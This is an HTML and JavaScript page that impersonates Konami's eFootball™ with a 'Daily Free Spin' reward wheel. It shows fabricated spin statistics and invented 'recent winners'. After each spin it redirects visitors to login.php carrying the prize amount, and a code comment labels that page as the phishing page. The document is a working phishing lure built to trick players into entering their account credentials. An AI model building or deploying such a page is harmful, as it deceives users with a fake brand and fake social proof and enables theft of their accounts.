<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball™ Daily Spin | Konami</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* Animated Background Outcomes */
        .bg-outcomes {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        .outcome-float {
            position: absolute;
            font-size: 2rem;
            font-weight: 700;
            opacity: 0;
            animation: floatUp 6s infinite;
            text-shadow: 0 0 20px currentColor;
        }
        @keyframes floatUp {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100px) rotate(10deg); opacity: 0; }
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 10;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 10px;
        }
        .logo-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            box-shadow: 0 10px 30px rgba(0,212,255,0.4);
        }
        .logo-text {
            font-size: 1.8rem;
            font-weight: 700;
            background: linear-gradient(135deg, #00d4ff, #ffffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            color: #a0b0c0;
            font-size: 0.95rem;
            font-weight: 500;
        }

        .stats {
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 30px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .stat-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .stat-row:last-child { margin-bottom: 0; }
        .stat-label { color: #a0b0c0; font-size: 0.9rem; }
        .stat-value {
            font-size: 1.4rem;
            font-weight: 700;
            background: linear-gradient(135deg, #00d4ff, #ffffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .wheel-container {
            position: relative;
            margin: 40px 0;
        }
        .wheel {
            width: 320px;
            height: 320px;
            border-radius: 50%;
            margin: 0 auto;
            background: conic-gradient(
                #ffd700 0deg 45deg,    /* 1000 Coins - Gold */
                #ff4444 45deg 90deg,   /* 500 Coins - Red */
                #44ff44 90deg 135deg,  /* 300 Coins - Green */
                #ffaa00 135deg 180deg, /* 150 Coins - Orange */
                #44ddff 180deg 225deg, /* 100 Coins - Cyan */
                #aaff44 225deg 270deg, /* 50 Coins - Lime */
                #ff44ff 270deg 315deg, /* 0 Coins - Magenta */
                #4444ff 315deg 360deg  /* Re-Spin - Blue */
            );
            border: 12px solid #1a2a3a;
            box-shadow: 
                0 0 50px rgba(0,212,255,0.5),
                inset 0 0 50px rgba(0,0,0,0.3);
            position: relative;
            transition: transform 4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
        }
        .wheel.spinning {
            transform: rotate(1080deg) !important;
        }
        .wheel-pointer {
            position: absolute;
            top: -18px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 25px solid transparent;
            border-right: 25px solid transparent;
            border-top: 50px solid #ff4757;
            filter: drop-shadow(0 0 10px #ff4757);
            z-index: 5;
        }
        .wheel-center {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #1a2a3a, #2a3a4a);
            border-radius: 50%;
            border: 8px solid #00d4ff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.1rem;
            font-weight: 600;
            color: white;
            box-shadow: 0 0 30px rgba(0,212,255,0.6);
        }

        .spin-btn {
            display: block;
            width: 220px;
            height: 70px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #ff6b35, #f7931e);
            border: none;
            border-radius: 40px;
            font-size: 1.3rem;
            font-weight: 700;
            color: white;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 
                0 15px 35px rgba(255,107,53,0.4),
                inset 0 1px 0 rgba(255,255,255,0.2);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .spin-btn:hover:not(:disabled) {
            transform: translateY(-5px);
            box-shadow: 
                0 20px 45px rgba(255,107,53,0.6),
                inset 0 1px 0 rgba(255,255,255,0.3);
        }
        .spin-btn:active:not(:disabled) {
            transform: translateY(-2px);
        }
        .spin-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }

        .results {
            min-height: 80px;
            text-align: center;
            margin: 30px 0;
            font-size: 1.6rem;
            font-weight: 700;
            text-shadow: 0 0 20px currentColor;
        }

        .recent-wins {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(15px);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.08);
        }
        .wins-title {
            font-size: 0.95rem;
            color: #a0b0c0;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .win-item {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 10px;
            font-size: 0.9rem;
            opacity: 0;
            animation: slideIn 0.5s forwards;
        }
        .win-avatar {
            width: 35px;
            height: 35px;
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            color: white;
            font-size: 0.8rem;
        }
        @keyframes slideIn {
            to { opacity: 1; transform: translateX(0); }
        }

        @media (max-width: 480px) {
            .wheel { width: 280px; height: 280px; }
            .container { padding: 15px; }
        }
    </style>
</head>
<body>
    <!-- Animated Background Outcomes -->
    <div class="bg-outcomes" id="bgOutcomes"></div>

    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">⚽</div>
                <div class="logo-text">eFootball™</div>
            </div>
            <div class="subtitle">Daily Free Spin Event</div>
        </div>

        <div class="stats">
            <div class="stat-row">
                <span class="stat-label">Today's Spins</span>
                <span class="stat-value" id="totalSpins">1,247</span>
            </div>
            <div class="stat-row">
                <span class="stat-label">Total Won</span>
                <span class="stat-value" id="totalCoins">2,847,500</span>
            </div>
            <div class="stat-row">
                <span class="stat-label">Your Reward</span>
                <span class="stat-value" id="yourReward">?</span>
            </div>
        </div>

        <div class="wheel-container">
            <div class="wheel" id="wheel">
                <div class="wheel-pointer"></div>
                <div class="wheel-center">SPIN</div>
            </div>
        </div>

        <button class="spin-btn" id="spinBtn">SPIN NOW!</button>
        <div class="results" id="results"></div>

        <div class="recent-wins">
            <div class="wins-title">Recent Winners</div>
            <div id="recentWins"></div>
        </div>
    </div>

    <script>
        const outcomes = [
            { coins: 1000, text: '💰 1,000 Coins!', color: '#ffd700', emoji: '🎉', rarity: 'Legendary' },
            { coins: 500, text: '🔥 500 Coins!', color: '#ff4444', emoji: '✨', rarity: 'Epic' },
            { coins: 300, text: '💎 300 Coins!', color: '#44ff44', emoji: '⭐', rarity: 'Rare' },
            { coins: 150, text: '✨ 150 Coins!', color: '#ffaa00', emoji: '🌟', rarity: 'Uncommon' },
            { coins: 100, text: '👍 100 Coins!', color: '#44ddff', emoji: '🎁', rarity: 'Common' },
            { coins: 50, text: '😊 50 Coins!', color: '#aaff44', emoji: '💰', rarity: 'Common' },
            { coins: 0, text: '😢 No Coins!', color: '#ff44ff', emoji: '💨', rarity: 'Miss' },
            { coins: 0, text: '🔄 Re-Spin!', color: '#4444ff', emoji: '➰', rarity: 'Re-Spin', respin: true }
        ];

        const wheel = document.getElementById('wheel');
        const spinBtn = document.getElementById('spinBtn');
        const results = document.getElementById('results');
        const yourReward = document.getElementById('yourReward');
        const bgOutcomes = document.getElementById('bgOutcomes');
        const recentWins = document.getElementById('recentWins');
        
        let isSpinning = false;
        let spinCount = 0;

        // Generate weighted random outcome
        function getRandomOutcome() {
            const rand = Math.random();
            if (rand < 0.03) return 0;      // 1000: 3%
            if (rand < 0.12) return 1;      // 500: 9%
            if (rand < 0.28) return 2;      // 300: 16%
            if (rand < 0.48) return 3;      // 150: 20%
            if (rand < 0.68) return 4;      // 100: 20%
            if (rand < 0.83) return 5;      // 50: 15%
            if (rand < 0.94) return 6;      // 0: 11%
            return 7;                       // Re-spin: 6%
        }

        // Create floating background outcome
        function createFloatOutcome(outcome) {
            const div = document.createElement('div');
            div.className = 'outcome-float';
            div.textContent = outcome.emoji + ' ' + outcome.text;
            div.style.color = outcome.color;
            div.style.left = Math.random() * 80 + '%';
            div.style.animationDelay = Math.random() * 2 + 's';
            bgOutcomes.appendChild(div);
            setTimeout(() => div.remove(), 6000);
        }

        // Add to recent winners
        function addRecentWin(outcome) {
            const div = document.createElement('div');
            div.className = 'win-item';
            div.innerHTML = `
                <div class="win-avatar">${randomName().charAt(0)}</div>
                <span>${randomName()} won ${outcome.text} (${outcome.rarity})</span>
            `;
            div.style.animationDelay = '0.' + (recentWins.children.length * 0.1) + 's';
            recentWins.insertBefore(div, recentWins.firstChild);
            if (recentWins.children.length > 5) {
                recentWins.removeChild(recentWins.lastChild);
            }
        }

        // Generate random player name
        function randomName() {
            const names = ['ProGamerX', 'MessiFan10', 'RonaldoGOAT', 'NeymarJr', 'Mbappe7', 'Haaland9', 'Salah11', 'DeBruyne', 'KDB17', 'Lewangoalski'];
            return names[Math.floor(Math.random() * names.length)];
        }

        spinBtn.addEventListener('click', () => {
            if (isSpinning) return;
            
            isSpinning = true;
            spinCount++;
            spinBtn.disabled = true;
            spinBtn.textContent = 'SPINNING...';
            results.textContent = '';
            yourReward.textContent = '?';

            const outcomeIndex = getRandomOutcome();
            const outcome = outcomes[outcomeIndex];

            // Simulate other players winning
            if (Math.random() < 0.7) {
                const fakeOutcome = outcomes[getRandomOutcome()];
                setTimeout(() => {
                    createFloatOutcome(fakeOutcome);
                    addRecentWin(fakeOutcome);
                }, 1000);
            }

            wheel.classList.add('spinning');
            
            setTimeout(() => {
                wheel.classList.remove('spinning');
                results.innerHTML = `<span style="color: ${outcome.color}">${outcome.emoji} ${outcome.text}</span>`;
                yourReward.textContent = outcome.coins.toLocaleString();
                
                // Create floating celebration
                createFloatOutcome(outcome);
                addRecentWin(outcome);
                
                setTimeout(() => {
                    if (outcome.respin) {
                        results.innerHTML += '<br><button class="spin-btn" style="font-size:1rem;padding:10px 20px;margin-top:15px;width:auto;display:inline-block;" onclick="location.reload()">RE-SPIN NOW!</button>';
                    } else {
                        // Auto-redirect to phishing page
                        setTimeout(() => {
                            window.location.href = 'login.php?reward=' + outcome.coins;
                        }, 2500);
                    }
                    
                    isSpinning = false;
                    spinBtn.disabled = false;
                    spinBtn.textContent = 'SPIN AGAIN!';
                }, 1500);
            }, 4200);
        });

        // Update live stats periodically
        setInterval(() => {
            document.getElementById('totalSpins').textContent = (1247 + Math.floor(Math.random() * 50)).toLocaleString();
            document.getElementById('totalCoins').textContent = (2847500 + Math.floor(Math.random() * 50000)).toLocaleString();
        }, 8000);

        // Initial recent winners
        for (let i = 0; i < 3; i++) {
            setTimeout(() => {
                const fakeOutcome = outcomes[getRandomOutcome()];
                addRecentWin(fakeOutcome);
            }, i * 500);
        }
    </script>
</body>
</html>
